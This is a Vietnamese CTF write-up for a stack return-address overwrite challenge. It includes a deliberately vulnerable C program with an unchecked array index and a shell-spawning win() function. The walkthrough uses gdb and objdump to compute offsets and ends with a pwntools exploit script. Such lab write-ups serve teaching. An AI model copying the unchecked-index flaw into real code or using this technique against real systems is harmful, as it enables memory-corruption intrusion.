```C
#include <stdio.h>
#include <stdlib.h>


void win(){
        system("/bin/sh");
}

void getLong(long* a){
        puts("enter number : "); 
        char buf[0x10] = {}; 
        fgets(buf, 0xf,stdin); 
        *a = atol(buf); 
} 
 
int main(int argc, char const *argv[]) 
{ 
        setbuf(stdin,NULL); 
        setbuf(stdout,NULL); 
        printf("your main %p\n",main); 
 
        long bof[0x10]; 
        long idx; 
        long value;
        getLong(&idx);
        getLong(&value);
        bof[idx] = value;
        return 0;
}
```


Đọc source code, ta có thể thấy chương trình in ra địa chỉ của hàm main, sau đó cho phép chúng ta ghi value vào vị trí bof[idx]

Chúng ta dễ dàng thấy, có thể ghi 1 giá trị bất kì vào 1 địa chỉ ở trong stack
-> chúng ta có thể ghi đè return value ở hàm main bằng địa chỉ của hàm win 

Dùng gdb, disass hàm main ta thấy địa chỉ của bof là rbp-0x90
![alt text](https://github.com/dev1de/images/blob/main/1.png)

Đặt breakpoint tại leave, chạy chương trình với idx = 0 và value = 1234 (0x4d2), kiểm tra stack

![alt text](https://github.com/dev1de/images/blob/main/2.png)

Vì bof có kiểu dữ liệu Long nên mỗi idx của bof sẽ cách nhau 8 bytes
-> idx cần ghi = (main_return_address - bof_address)/8 = 19

Chương trình in ra địa chỉ hàm main() do đó ta có thể tính được địa chỉ của hàm win()
win_addr = main_address - main_offset + win_offset

Sử dụng objdump để tìm được offset của main() và win()

![alt text](https://github.com/dev1de/images/blob/main/3.png)

![alt text](https://github.com/dev1de/images/blob/main/4.png)

Ta có script để get shell:
```python
import pwn
p = pwn.process("./bof1")
p.recvuntil('your main ')
main = p.readline()[:14]
main = int(main.decode('utf-8'),16) - (0x9d - 0x09)
p.sendline(str(19))
p.write(str(main))
p.interactive()
```
